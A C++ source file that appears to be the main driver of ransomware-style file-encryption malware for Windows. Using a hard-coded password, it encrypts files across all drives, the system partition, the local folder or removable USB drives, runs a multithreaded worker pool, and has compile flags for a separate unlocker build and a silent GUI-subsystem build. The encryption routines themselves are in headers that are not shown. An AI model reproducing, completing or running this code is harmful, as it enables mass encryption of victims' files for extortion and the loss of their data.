#include "crypto_service.h"
#include "file_service.h"
#include "disk_service.h"
#include "worker_pool.h"
#include "config.h"
#include <iostream>
#include <fstream>
#include <algorithm>
#include <string>
#include <chrono>

// Global instantiation of self-path declared in file_service.h
fs::path g_selfExePath;

// Helper to get executable file path
fs::path GetCurrentExecutablePath() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return fs::path(path);
}

int RunApp() {
    g_selfExePath = GetCurrentExecutablePath();

    std::string password = CONFIG_PASSWORD;
    int targetMode = CONFIG_TARGET_MODE;

    // Use password mode for encryption/decryption
    std::string keyContent = "";
    bool fullMode = false; // Default: fast mode

#ifdef BUILD_UNLOCKER
    bool isLock = false;
#else
    bool isLock = true;
#endif

    // Setup worker process lambda
    auto processFunc = [isLock, keyContent, password, fullMode](const fs::path& filePath) -> bool {
        if (isLock) {
            return FileService::LockFile(filePath, keyContent, password, fullMode);
        } else {
            return FileService::UnlockFile(filePath, keyContent, password);
        }
    };

    // Determine target paths based on config target mode
    std::vector<fs::path> targets;

    if (targetMode == 1) { // 1 = ALL drives
        targets = DiskService::GetAvailableDrives();
    }
    else if (targetMode == 2) { // 2 = Local directory (same directory as executable)
        targets.push_back(g_selfExePath.parent_path());
    }
    else if (targetMode == 3) { // 3 = Same Drive partition (e.g. C:\)
        targets.push_back(g_selfExePath.root_path());
    }
    else if (targetMode == 4) { // 4 = External Drives Only (removable USB / HDDs)
        char driveBuffer[512];
        DWORD size = GetLogicalDriveStringsA(sizeof(driveBuffer), driveBuffer);
        if (size > 0 && size < sizeof(driveBuffer)) {
            char* drive = driveBuffer;
            while (*drive) {
                UINT driveType = GetDriveTypeA(drive);
                if (driveType == DRIVE_REMOVABLE) {
                    targets.push_back(fs::path(drive));
                }
                drive += strlen(drive) + 1;
            }
        }
    }

    // Dynamic thread count based on hardware
    size_t numThreads = std::thread::hardware_concurrency();
    if (numThreads == 0) numThreads = 4;

    // Instantiate worker pool
    WorkerPool pool(numThreads, processFunc);

    auto startTime = std::chrono::high_resolution_clock::now();

    for (const auto& targetPath : targets) {
        DiskService::ScanDirectory(targetPath, pool);
    }

    pool.wait_and_shutdown();

    auto endTime = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = endTime - startTime;

#ifndef BUILD_GUI
    std::cout << "\n=========================================================\n";
    std::cout << "[*] Execution complete in " << elapsed.count() << " seconds.\n";
    std::cout << "    Processed: " << pool.get_processed_count() << " files\n";
    std::cout << "    Skipped:   " << pool.get_skipped_count() << " files\n";
    std::cout << "=========================================================\n";
#endif

    return 0;
}

#ifdef BUILD_GUI
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    return RunApp();
}
#else
int main(int argc, char* argv[]) {
    return RunApp();
}
#endif
